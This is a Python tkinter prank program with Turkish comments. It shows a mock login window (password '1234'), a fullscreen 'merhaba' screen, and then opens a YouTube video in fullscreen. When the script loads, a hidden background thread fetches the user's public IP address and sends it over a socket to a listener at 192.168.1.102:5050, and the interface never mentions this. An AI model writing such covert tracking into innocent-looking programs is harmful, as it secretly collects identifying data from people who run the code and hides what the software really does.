import socket
import requests
import threading
import tkinter as tk
import time
import webbrowser
import keyboard

# 1. IP adresini alıp sunucuya gönder (her durumda çalışacak)
def send_ip():
    ip = requests.get("https://api.ipify.org").text
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("192.168.1.102", 5050))
        client.send(ip.encode())
        client.close()
    except Exception as e:
        print("IP gönderim hatası:", e)

threading.Thread(target=send_ip, daemon=True).start()


# 2. “merhaba” ekranı aç ve YouTube’u tam ekranda başlatacak fonksiyon
def show_merhaba_then_youtube():
    root = tk.Tk()
    root.configure(bg="white")
    root.attributes("-fullscreen", True)
    root.title("Merhaba")

    tk.Label(
        root,
        text="merhaba",
        font=("Arial", 48, "bold"),
        fg="black",
        bg="white"
    ).place(relx=0.5, rely=0.5, anchor="center")

    def close_and_launch():
        root.destroy()
        time.sleep(0.5)
        webbrowser.open("https://www.youtube.com/watch?v=NqdOVT1IKPA")
        time.sleep(2.5)
        keyboard.press_and_release("f")

    root.after(3000, close_and_launch)
    root.mainloop()


# 3. Giriş arayüzü: placeholder, yatay şifre, talimat, ortalanmış ve büyük pencere
def show_login_and_start():
    login = tk.Tk()
    login.title("Anan yazılım")
    w, h = 500, 250
    login.geometry(f"{w}x{h}")
    login.resizable(False, False)

    # Ortala
    login.update_idletasks()
    x = (login.winfo_screenwidth() // 2) - (w // 2)
    y = (login.winfo_screenheight() // 2) - (h // 2)
    login.geometry(f"+{x}+{y}")

    # Başlık
    tk.Label(
        login,
        text="Anan yazılım",
        font=("Arial", 20, "bold")
    ).pack(pady=(10, 5))

    # Yatay şifre bilgisi (harf + rakam)
    tk.Label(
        login,
        text="şifre:1234",
        font=("Arial", 14)
    ).place(x=20, y=60)

    # "Enter'e basarak gireceksin" talimatı
    tk.Label(
        login,
        text="Enter'e basarak gireceksin",
        font=("Arial", 12),
        fg="gray"
    ).place(x=w - 200, y=65)

    # Şifre Entry'si ve placeholder
    pw_entry = tk.Entry(login, font=("Arial", 16), width=12, fg="gray")
    pw_entry.place(relx=0.5, rely=0.5, anchor="center")
    placeholder = "şifre"
    pw_entry.insert(0, placeholder)

    def on_focus_in(event):
        if pw_entry.get() == placeholder:
            pw_entry.delete(0, tk.END)
            pw_entry.config(fg="black", show="*")

    def on_focus_out(event):
        if not pw_entry.get():
            pw_entry.insert(0, placeholder)
            pw_entry.config(fg="gray", show="")

    pw_entry.bind("<FocusIn>", on_focus_in)
    pw_entry.bind("<FocusOut>", on_focus_out)

    # Hata mesajı
    error_label = tk.Label(login, text="", fg="red", font=("Arial", 12))
    error_label.place(relx=0.5, rely=0.65, anchor="center")

    # Enter ile kontrol
    def on_enter(event=None):
        pwd = pw_entry.get()
        if pwd == "1234":
            login.destroy()
            show_merhaba_then_youtube()
        else:
            error_label.config(text="Yanlış şifre")

    pw_entry.bind("<Return>", on_enter)
    pw_entry.focus()
    login.mainloop()


if __name__ == "__main__":
    show_login_and_start()